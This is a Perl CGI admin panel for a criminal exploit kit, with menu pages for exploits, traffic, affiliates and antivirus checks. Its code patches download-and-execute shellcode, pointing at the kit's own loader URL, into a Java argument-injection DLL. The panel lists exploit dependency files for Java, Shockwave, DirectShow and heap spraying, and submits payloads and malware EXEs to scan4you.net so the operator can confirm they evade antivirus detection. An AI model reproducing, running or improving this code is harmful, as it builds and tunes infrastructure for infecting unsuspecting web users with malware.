#!/usr/bin/perl
  
  # xplindex.pl
  use CGI;
  use CGI::Carp qw/fatalsToBrowser warningsToBrowser/;
  use CGI::Session ( '-ip_match' );
  use DBI;
  use LWP::UserAgent;
  require "xpl/config.pl";
  require "xpl/lib/JsXOR.pm";
  require "xpl/lib/Shellcode.pm";
  
  $session = CGI::Session->load();
  $q = new CGI;
  
  $cook = $q->param('cook');
  $vfy = $q->param('vfy');
  $chkdomain = $q->param('chkdomain');
  $chkexploit = $q->param('chkexploit');
  $chkdependencies = $q->param('chkdependencies');
  $domaintochk = $q->param('domaintochk');
  $keyz = $q->param('keyz');
  $exetochk = $q->param('exetochk');
  $chkexe = $q->param('chkexe');
  
  $db_name = 'DBI:mysql:' . $config{MysqlDB};
  $dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";
  
  if($vfy ne 'xplad')
  {
    print "Status: 301 Moved\nLocation: login.pl\n\n";
  }  
  if($session->is_expired)
  {
      print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
      print "Your has session expired. Please login again.";
      print "<br/><a href='login.pl>Login</a>";
  }
  elsif($session->is_empty)
  {
      #print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
      print "Status: 301 Moved\nLocation: login.pl\n\n";
  }
  else
  {
    if($chkdomain eq 'yes')
    {
      $domaincontent .= '<br><b><u>' . $domaintochk . '</u></b><br>'; 
      $domaincontent .= thedomaincheck('domain');
    }
    if($chkdependencies eq 'yes')
    {
      if($domaintochk eq 'template.dll')
      {
        #build shellcode
        $urlllll = $config{UrlToFolder} . '/loads.pl?aff=admin&xplload=java_arginject';
        $prependshell = "\x81\xc4\x54\xf2\xff\xff";
        $shellcode = Shellcode::pdfgetshell($urlllll);
        $stringtoerase = 'PAYLOAD:' . "\x00" x (length($shellcode) - 2);
        $stringtoreplace = $prependshell . $shellcode;
	
        #make dll
        $urltodll = 'xpl/dep/template.dll';
        $dataload = "";
        open(FILE,"<$urltodll") || die "file cannot be openned $urltodll\n";
        while(<FILE>)
        {
          $dataload .= $_;
        }
        close(FILE);
        $dataload =~ s/$stringtoerase/$stringtoreplace/;
        open(FILE2,">xpl/dep/temptempl.dll") || die "file cannot be writed\n";
        print FILE2 $dataload;
        close(FILE2);
        
        $domaintochk = 'xpl/dep/temptempl.dll';
        $dependenciescontent .= '<br><b><u>temptempl.dll</u></b><br>';
        $dependenciescontent .= thedomaincheck('file');
        unlink('xpl/dep/temptempl.dll');
      }
      else
      {
        $domaintochk = 'xpl/dep/' . $domaintochk;
        $dependenciescontent .= '<br><b><u>' . $domaintochk . '</u></b><br>';
        $dependenciescontent .= thedomaincheck('file');
      }
    }

    if($chkexe eq 'yes')
    {
      $domaintochk = $exetochk;
      $execontent .= '<br><b><u>' . $domaintochk . '</u></b><br>';
      $execontent .= thedomaincheck('file');
    }

    if($chkexploit eq 'yes')
    {
      #Update keyz to defined value
      $req = "UPDATE options SET keyz='$keyz' WHERE username='Admin'";
      $sth = $dbh->prepare($req);
      $sth->execute() || die;

      $rawexploitchk = $config{UrlToFolder} . 'avcheck.pl?keyz=' . $keyz . '&exploittocheck=' . $domaintochk;
      $domaintochk = $rawexploitchk;
      $exploitcontent .= '<br><b><u>' . $domaintochk . '</u></b><br>';
      $exploitcontent .= thedomaincheck('url');

      #update with blank key to block AVs checking this file
      $req = "UPDATE options SET keyz='' WHERE username='Admin'";
      $sth = $dbh->prepare($req);
      $sth->execute() || die;
    }

    $hiddenvalue = "";
    $hiddenvalue .= "<input type=\"hidden\" name=\"cook\" value=\"$cook\">\n";
    $hiddenvalue .= "<input type=\"hidden\" name=\"selectuser\" value=\"$selectuser\">\n";;
    $hiddenvalue .= "<input type=\"hidden\" name=\"vfy\" value=\"xplad\">\n";
    $domainraw = $config{UrlToFolder};
    $domainraw =~ s/http:\/\///eg;
    $domainraw =~ s/\/xpl\///eg;

    
    #Select all exes from DB
    $choiceoption = '';

    $req = "SELECT filez FROM affiliates";
    $sth = $dbh->prepare($req);
    $sth->execute() || die;
    while(my @row = $sth->fetchrow_array)
    {
      $filez = $row['0'];
      if($filez eq '')
      {
        $choiceoption .= '<option value="xpl/dep/default.exe">default.exe</option>' . "\n";
      }
      else
      {
        $choiceoption .= '<option value="xpl/dep/' . $filez . '">' . $filez . '</option>' . "\n";
      }
    }

    $alloptionsxopl = '';
    $req = "SELECT name,description FROM exploits";
    $sth = $dbh->prepare($req);
    $sth->execute() || die;
    while(my @row = $sth->fetchrow_array)
    {
      $xplname = $row['0'];
      $xpldesc = $row['1'];
      $alloptionsxopl .= '<option value="' . $xplname . '">' . $xpldesc . '</option>;' . "\n";
    }

    print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
    indexalltab();
  }
  
sub indexalltab
{
 print <<THEHTMLINDEX;
 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<HTML xmlns="http://www.w3.org/1999/xhtml" lang="fr"><HEAD><META http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">

<TITLE>$config{NetName} - Admin Panel</TITLE>
    <LINK rel="stylesheet" type="text/css" href="style/style3.css" media="all">
    
</HEAD><BODY>
<DIV id="top_nav">
	<DIV class="content">
	<center>
    
        <UL>
            <LI><A href="xplindex.pl?cook=$cook&vfy=xplad" title="Home" class="Home">Home</A></LI>
            <LI><A href="xplstats.pl?cook=$cook&vfy=xplad" title="Reports">Reports</A></LI>
            <LI><A href="xplprograms.pl?cook=$cook&selectuser=Admin&vfy=xplad" title="Accounts">Accounts</A></LI>
	    <LI><A href="xploptions.pl?cook=$cook&selectuser=$selectuser&vfy=xplad" title="Exploits Options">Exploits</A></LI>
	    <LI><A href="xpltraffic.pl?cook=$cook&selectuser=$selectuser&vfy=xplad" title="Traffic Options">Traffic</A></LI>
            <LI><A href="xplavs.pl?cook=$cook&selectuser=$selectuser&vfy=xplad" title="AVs Check">AV Check</A></LI>
            <LI><A href="login.pl?action=logout" title="Log Out">Log Out</A></LI>
        </UL>
    </center>    
    </DIV>
</DIV>
<center>
<br>
<b>
</b>
<h2>[ Virus and BlackList Check ]</h2>
<br>
<DIV id="main">
<DIV class="content">
<DIV id="pages">
<DIV id="home">
<DIV>
</DIV>
<br>
<h3>Exploits Check</h3>
<br>
<form method="post">
$hiddenvalue
Key: <input type="text" name="keyz" length="1" value=""><br>
<SELECT name="domaintochk">
$alloptionsxopl
</SELECT><br>
<input type="hidden" name="chkexploit" value="yes">
<input type="submit" value="Check Exploit" />
</form>
$exploitcontent
<br><br>


<h3>Dependencies Check</h3>
<br>
<form method="post">
$hiddenvalue
<SELECT name="domaintochk">
<option value="1268505228.gif">Directshow picture</option>
<option value="Applet.jar">Java Calendar Applet</option>
<option value="template.dll">Java Argument Injection dll</option>
<option value="kodak.icm">Java CMM Kodak.icm</option>
<option value="Curve.class">Java CMM .class file</option>
<option value="heaplib.js">HeapLib JS file</option>
<option value="12685055265.DIR">Shockwave dependency file</option>
<option value="generic-1296925738.dll">ms11_xxx .net dll</option>
<option value="PluginDetect.js">Detect Plugin JS</option>
<option value="getJavaInfo.jar">Detect Java ver jar</option>
</SELECT><br>
<input type="hidden" name="chkdependencies" value="yes">
<input type="submit" value="Check File" />
</form>
$dependenciescontent
<br><br>


<h3>EXE Check</h3>
<form method="post">
$hiddenvalue
<SELECT name="exetochk">
$choiceoption
</SELECT><br>
<input type="hidden" name="chkexe" value="yes">
<input type="submit" value="Check File" />
</form>
$execontent
<br><br>


<h3>Domain Check</h3>
<form method="post">
$domaincontent
<br>
$hiddenvalue
<input type="hidden" name="domaintochk" value="$domainraw">
<input type="hidden" name="chkdomain" value="yes">
<input type="submit" value="Check Domain" />
</form>
<br><br>


<br><br>
</DIV>
</DIV>
</DIV>
</DIV>
<br><br>
</center>

<DIV id="footer">
	<DIV class="content">
        <DIV class="copyright">
        	<P><BR>
        </DIV>        
    </DIV>
</DIV>

</body>
</html>
 
 
THEHTMLINDEX
}

sub thedomaincheck
{
  my $type = shift;
  my $url='http://scan4you.net/remote.php';
  my $format='txt'; # json - for JSON return
  my $file = $domaintochk;
  my $browser=LWP::UserAgent->new();
  my @ns_headers = ();
  my %cont = (id=>$config{Scanid}, token=>$config{Scantoken}, action=>$type);
  $cont{'uppload'}=["$file"] if ($type eq 'file');
  $cont{$type}=$file if ($type ne 'file');
  $cont{'frmt'}=$format;
  #die "@ns_headers\n";
  $resp=$browser->post($url,@ns_headers,Content_Type=>'form-data', Content=>\%cont);
  if($resp->code!=302 && $resp->code!=200) {
      $decodedvalue = "Upload failed! Will try again. Output was:\n".$resp->as_string;
  } else {
      $decodedvalue = $resp->decoded_content;
  }
  $decodedvalue =~ s/\n/<br>/g;
  $decodedvalue =~ s/:(.*?)<br>/:<font color="red"> $1<\/font><br>/g;
  $decodedvalue =~ s/"red"> OK/"green"> OK/g;
  return $decodedvalue;
}


1;
